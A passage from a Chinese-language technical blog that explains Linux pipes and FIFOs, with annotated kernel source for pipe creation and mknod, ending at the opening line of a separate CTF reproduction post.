class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>两次调用 <code>mkfifo</code> 创建一对“管道文件”（<code>fifo1</code>-负责写，<code>fifo2</code>-负责读）</li>
<li>通过 <code>open</code> 这两个“管道文件”把两个进程联系起来</li>
<li>结果：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ./pipe3a                 </span><br><span class="line">123 # 输入1</span><br><span class="line">rcv:abc # 接收2</span><br><span class="line"></span><br><span class="line">➜  exp ./pipe3b                 </span><br><span class="line">rcv data:123 # 接收1</span><br><span class="line">abc # 输入2</span><br></pre></td></tr></table></figure>
<p><strong>无名 Pipe 的实现</strong></p>
<p>在 Linux 中，管道的实现借助了文件系统的 file 结构和 VFS 的索引节点 inode</p>
<ul>
<li>通过将两个 file 结构指向同一个临时的 VFS 索引节点</li>
<li>而这个 VFS 索引节点又指向一块物理空间而实现的</li>
</ul>
<p>管道描述符 <code>pipe_inode_info</code>，用于表示一个管道，存储管道相应的信息： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span>					    <span class="comment">/* 互斥锁 */</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> wait;					<span class="comment">/* 对于空/满管道的读/写等待点 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nrbufs, curbuf, buffers;	 <span class="comment">/* 非空管道缓冲区的数量/当前管道缓冲区条目/缓冲区总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;					<span class="comment">/* 该管道的当前读者数量(每次以读方式打开时,readers加1,关闭时readers减1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;					<span class="comment">/* 该管道的当前写者数量(每次以写方式打开时,writers加1,关闭时writers减1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;						<span class="comment">/* 引用此管道的file结构体数量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> waiting_writers;			 <span class="comment">/* 被阻塞的管道写者数量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;					<span class="comment">/* 管道读者记数器,每次以读方式打开管道时,r_counter加1,关闭是不变 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;					<span class="comment">/* 管道写者计数器,每次以写方式打开管道时,w_counter加1,关闭是不变 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span>					<span class="comment">/* 页缓存,可以加速页帧的分配过程,当释放页帧时将页帧记入tmp_page,当分配页帧时,优先从tmp_page中获取(如果tmp_page为空才从伙伴系统中获取) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span>		<span class="comment">/* 读端异步描述符 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span>		<span class="comment">/* 写端异步描述符 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span>				   <span class="comment">/* 回环缓冲区(由16个pipe_buffer对象组成,每个pipe_buffer对象拥有一个内存页) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>			 	   <span class="comment">/* 创建此管道的用户 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>创建管道：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 用户态封装 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> pipefd[<span class="number">2</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe2</span><span class="params">(<span class="keyword">int</span> pipefd[<span class="number">2</span>], <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 内核态入口 */</span></span><br><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags); <span class="comment">/* O_NONBLOCK:非阻塞,O_CLOEXEC:fork和exec时是否关闭 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe()系统调用 */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>do_pipe2</code>：核心</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sys_pipe() is the normal C calling standard for creating</span></span><br><span class="line"><span class="comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_pipe2</span><span class="params">(<span class="keyword">int</span> __user *fildes, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">files</span>[2];</span></span><br><span class="line">	<span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">	error = __do_pipe_flags(fd, files, flags); <span class="comment">/* 分配两个struct file数据结构,一个用来读,一个用来写 */</span></span><br><span class="line">	<span class="keyword">if</span> (!error) &#123;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="keyword">sizeof</span>(fd)))) &#123; <span class="comment">/* 调用copy_to_user将两个fd拷贝至用户态 */</span></span><br><span class="line">			fput(files[<span class="number">0</span>]); <span class="comment">/* 将两个files归还 */</span></span><br><span class="line">			fput(files[<span class="number">1</span>]);</span><br><span class="line">			put_unused_fd(fd[<span class="number">0</span>]); <span class="comment">/* 将两个fd归还 */</span></span><br><span class="line">			put_unused_fd(fd[<span class="number">1</span>]);</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fd_install(fd[<span class="number">0</span>], files[<span class="number">0</span>]); <span class="comment">/* 对应fd下标的指针赋值为file */</span></span><br><span class="line">			fd_install(fd[<span class="number">1</span>], files[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>__do_pipe_flags</code>：创建两个 <code>file</code> 结构，并获取其文件描述符</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __do_pipe_flags(<span class="keyword">int</span> *fd, struct file **files, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> fdw, fdr;</span><br><span class="line">	<span class="comment">/* 首先检查flag标志位 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT))  </span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	error = create_pipe_files(files, flags); <span class="comment">/* 创建两个file结构 */</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line">	error = get_unused_fd_flags(flags); <span class="comment">/* 获取文件描述符fdr */</span></span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_read_pipe;</span><br><span class="line">	fdr = error; <span class="comment">/* 赋值为fdr */</span></span><br><span class="line">	error = get_unused_fd_flags(flags); <span class="comment">/* 获取文件描述符fdw */</span></span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fdr;</span><br><span class="line">	fdw = error; <span class="comment">/* 赋值为fdw */</span></span><br><span class="line"></span><br><span class="line">	audit_fd_pair(fdr, fdw);</span><br><span class="line">	fd[<span class="number">0</span>] = fdr; <span class="comment">/* read-0 */</span></span><br><span class="line">	fd[<span class="number">1</span>] = fdw; <span class="comment">/* write-1 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err_fdr:</span><br><span class="line">	put_unused_fd(fdr);</span><br><span class="line"> err_read_pipe:</span><br><span class="line">	fput(files[<span class="number">0</span>]);</span><br><span class="line">	fput(files[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>create_pipe_files</code>：创建两个 <code>file</code> 结构</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_pipe_files</span><span class="params">(struct file **res, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> get_pipe_inode(); <span class="comment">/* 首先为管道分配一个inode */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> -ENFILE;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 分配一个file write */</span></span><br><span class="line">	f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">				&amp;pipefifo_fops);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(f)) &#123; </span><br><span class="line">		free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">		iput(inode);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f-&gt;private_data = inode-&gt;i_pipe; <span class="comment">/* 设置file的私有数据为inode pipe */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 分配一个file read(其实就是直接复制file write) */</span></span><br><span class="line">	res[<span class="number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),</span><br><span class="line">				  &amp;pipefifo_fops);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(res[<span class="number">0</span>])) &#123;</span><br><span class="line">		put_pipe_info(inode, inode-&gt;i_pipe);</span><br><span class="line">		fput(f);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(res[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe; <span class="comment">/* 设置file的私有数据为 inode pipe */</span></span><br><span class="line">	res[<span class="number">1</span>] = f;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>因为 <code>file read</code> 直接复制了 <code>file write</code>，所以它们的底层使用同一个 <code>inode</code>，指向同一片内存地址</li>
</ul>
<p>打开管道：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 用户态封装 */</span></span><br><span class="line"><span class="function">FILE *<span class="title">fdopen</span><span class="params">(<span class="keyword">int</span> fildes, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 内核态入口 */</span></span><br><span class="line">SYSCALL_DEFINE3(open, <span class="keyword">const</span> <span class="keyword">char</span> __user *, filename, <span class="keyword">int</span>, flags, <span class="keyword">umode_t</span>, mode)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (force_o_largefile()) <span class="comment">/* x86_64 恒定为 true */</span></span><br><span class="line">		flags |= O_LARGEFILE;</span><br><span class="line">	<span class="keyword">return</span> do_sys_open(AT_FDCWD, filename, flags, mode); <span class="comment">/* 其实底层还是open */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>有名 Pipe 的实现</strong></p>
<p>FIFO (First in First out) 为一种特殊的文件类型，它在文件系统中有对应的路径，当一个进程以读的方式打开该文件，而另一个进程以写的方式打开该文件，那么内核就会在这两个进程之间建立管道，所以 FIFO 实际上也由内核管理，不与硬盘打交道</p>
<ul>
<li>之所以叫 FIFO，是因为管道本质上是一个先进先出的队列数据结构，最早放入的数据被最先读出来，从而保证信息交流的顺序</li>
</ul>
<p>FIFO 只是借用了文件系统来为管道命名（File System，命名管道是一种特殊类型的文件，因为 Linux 中所有事物都是文件，它在文件系统中以文件名的形式存在）</p>
<ul>
<li>写模式的进程向 FIFO 文件中写入</li>
<li>读模式的进程从 FIFO 文件中读出</li>
<li>当删除 FIFO 文件时，管道连接也随之消失</li>
</ul>
<p>FIFO 的好处在于我们可以通过文件的路径来识别管道，从而让没有亲缘关系的进程之间建立连接</p>
<p>创建管道：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mknod</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname , <span class="keyword">mode_t</span> mode , <span class="keyword">dev_t</span> dev)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname , <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>有名管道在底层的实现跟无名管道完全一致，区别只是命名管道会有一个全局可见的文件名以供别人 <code>open()</code> 打开使用</li>
<li>创建完之后，其他进程就可以使用 <code>open() read() write()</code> 标准文件操作等方法进行使用了 </li>
<li>无论有名还是无名管道，它的文件描述都没有偏移量的概念，所以不能用 <code>lseek</code> 进行偏移量调整</li>
<li>不管是 <code>mknod</code> 还是 <code>mkfifo</code>，底层都是这个系统调用：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ecd900</span> &lt;__xmknod+<span class="number">32</span>&gt;    syscall  &lt;SYS_mknod&gt;</span><br><span class="line">       path: <span class="number">0x555555556019</span> ◂— <span class="number">0x326f6669662f2e</span></span><br><span class="line">       mode: <span class="number">0x11b4</span></span><br><span class="line">       dev: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在内核中对应的函数为：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">ksys_mknod</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename, <span class="keyword">umode_t</span> mode,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">unsigned</span> <span class="keyword">int</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> do_mknodat(AT_FDCWD, filename, mode, dev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_mknodat</span><span class="params">(<span class="keyword">int</span> dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user *filename, <span class="keyword">umode_t</span> mode,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">path</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> lookup_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	error = may_mknod(mode);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line">retry:</span><br><span class="line">	dentry = user_path_create(dfd, filename, &amp;path, lookup_flags); <span class="comment">/* 查找路径中的最后一个项的父目录项 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(dentry))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(dentry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!IS_POSIXACL(path.dentry-&gt;d_inode))</span><br><span class="line">		mode &amp;= ~current_umask();</span><br><span class="line">	error = security_path_mknod(&amp;path, dentry, mode, dev);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">switch</span> (mode &amp; S_IFMT) &#123; </span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">case</span> S_IFREG: <span class="comment">/* 普通文件(默认) */</span></span><br><span class="line">			error = vfs_create(path.dentry-&gt;d_inode,dentry,mode,<span class="literal">true</span>); <span class="comment">/* 创建普通文件 */</span></span><br><span class="line">			<span class="keyword">if</span> (!error)</span><br><span class="line">				ima_post_path_mknod(dentry);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> S_IFCHR: <span class="keyword">case</span> S_IFBLK: <span class="comment">/* 字符设备文件/块设备文件 */</span></span><br><span class="line">			error = vfs_mknod(path.dentry-&gt;d_inode,dentry,mode,</span><br><span class="line">					new_decode_dev(dev)); <span class="comment">/* 创建特殊文件(FIFO,插口,字符设备文件,块设备文件),new_decode_dev用于创建设备号 */</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> S_IFIFO: <span class="keyword">case</span> S_IFSOCK: <span class="comment">/* 有名管道FIFO/套接字 */</span></span><br><span class="line">			error = vfs_mknod(path.dentry-&gt;d_inode,dentry,mode,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">	done_path_create(&amp;path, dentry); <span class="comment">/* 减少path和dentry的计数 */</span></span><br><span class="line">	<span class="keyword">if</span> (retry_estale(error, lookup_flags)) &#123;</span><br><span class="line">		lookup_flags |= LOOKUP_REVAL;</span><br><span class="line">		<span class="keyword">goto</span> retry;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们的目的是创建有名管道 FIFO，所以会调用 <code>vfs_mknod</code>：（创建 <code>inode</code> 的公共流程函数）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_mknod</span><span class="params">(struct inode *dir, struct dentry *dentry, <span class="keyword">umode_t</span> mode, <span class="keyword">dev_t</span> dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> error = may_create(dir, dentry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((S_ISCHR(mode) || S_ISBLK(mode)) &amp;&amp; !capable(CAP_MKNOD))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!dir-&gt;i_op-&gt;mknod) <span class="comment">/* 保证&quot;dir-&gt;i_op-&gt;mknod&quot;不为空 */</span></span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	error = devcgroup_inode_mknod(mode, dev);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_inode_mknod(dir, dentry, mode, dev);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = dir-&gt;i_op-&gt;mknod(dir, dentry, mode, dev); <span class="comment">/* 根据文件系统决定 */</span></span><br><span class="line">	<span class="keyword">if</span> (!error)</span><br><span class="line">		fsnotify_create(dir, dentry);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_mknod);</span><br></pre></td></tr></table></figure>
<ul>
<li>对于 Ext4 文件系统来说，<code>dir-&gt;i_op-&gt;mknod</code> 实际上是调用 <code>ext4_mknod</code></li>
<li>接下来就是一些繁琐的工作了</li>
</ul>
<p><strong>Shell Pipe</strong></p>
<p>最简单的 Shell Pipe：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls | grep log.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>其实就是把 <code>ls</code> 的输出作为 <code>grep</code> 的输入</li>
</ul>
<p>Shell 中通过 <code>fork + exec</code> 创建子进程来执行命令，如果是含管道的 Shell 命令，则管道前后的命令分别由不同的进程执行，然后 <strong>通过管道把两个进程的标准输入输出连接起来</strong> ，就实现了管道</p>
<ul>
<li>PS：感觉和 “兄弟进程通信案例” 中的实现思路差不多</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/11/cpp%20pwn+vector%20%E7%BB%93%E6%9E%84%E4%BD%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/11/cpp%20pwn+vector%20%E7%BB%93%E6%9E%84%E4%BD%93/" class="post-title-link" itemprop="url">cpp pwn+vector 结构体</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-11 18:29:32 / Modified: 18:31:50" itemprop="dateCreated datePublished" datetime="2022-09-11T18:29:32+08:00">2022-09-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ByteCSMS 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
